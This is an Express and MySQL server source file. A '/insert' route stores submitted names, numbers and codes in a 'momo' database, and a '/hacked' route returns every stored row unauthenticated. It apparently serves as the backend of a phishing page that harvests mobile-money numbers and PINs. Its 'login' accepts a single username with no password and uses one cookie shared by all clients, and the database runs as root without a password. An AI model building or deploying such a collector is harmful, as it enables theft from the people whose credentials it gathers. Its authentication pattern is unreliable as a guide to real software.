const express = require("express");
const cors = require("cors");
const mysql = require("mysql");
const bodyParser = require("body-parser");
const Cookies = require('universal-cookie')

const PORT = process.env.PORT | 3001;
let cookie = new Cookies()

const app = express();

app.use(cors());
app.use(express.json());
app.use(bodyParser.urlencoded({ extended: true }));

const db = mysql.createConnection({
  host: "172.19.240.1",
  user: "root",
  database: 'momo_db'
});

db.connect((err) => {
  if(err) throw err
  console.log('Connected')
})

app.get("/admin", (req, res) => {
  if(cookie.get('login') !== 'success') {
    res.send({user: null})
  } else {
    res.send({user: 'success'})
  }
});

app.post('/login', (req,res) => {
  if(req.body.username === 'abass') {
    cookie.set('login', 'success')
  }
  res.send({login: cookie.get('login') || 'nouser'})
})


app.post("/hacked", (req, res) => {
  const sql = "SELECT * FROM momo_tb";
  db.query(sql, (err, result) => {
    console.log(err)
    if (err) res.json({message: 'ERROR, Cant connect to the DB'});
    res.json(result);
  });
});

app.post("/insert", (req, res) => {
  const sql = "INSERT INTO momo_tb(name, num,code) VALUES(?,?,?)";
  db.query(sql, [req.body.name, req.body.num, req.body.code], (err, result) => {
    if (err) throw err;
    console.log("Insert successfully");
  });
});

app.listen(PORT, () => {
  console.log(`Server is runnig on http://localhost:${PORT}`);
});
